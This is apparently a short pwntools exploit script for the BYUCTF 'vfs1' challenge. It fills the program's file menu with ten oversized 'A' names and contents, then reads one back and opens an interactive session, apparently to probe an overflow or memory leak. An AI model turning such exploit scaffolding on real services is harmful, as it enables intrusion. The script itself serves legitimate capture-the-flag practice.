from pwn import *

io = process('./vfs1')
elf = context.binary = ELF('./vfs1')
#io = remote('byuctf.xyz', 40008)

context.log_level = 'debug'
def create_file(name, cnt):
    io.sendlineafter(b'> ', b'1')
    io.sendlineafter(b'> ', name)
    io.sendlineafter(b'> ', cnt)
    
def read_file(idx):
    io.sendlineafter(b'> ', b'4')
    io.sendline(idx)
    
for i in range(10):
    create_file(b'A'*32, b'A'*256)

read_file(b'1')

io.interactive()
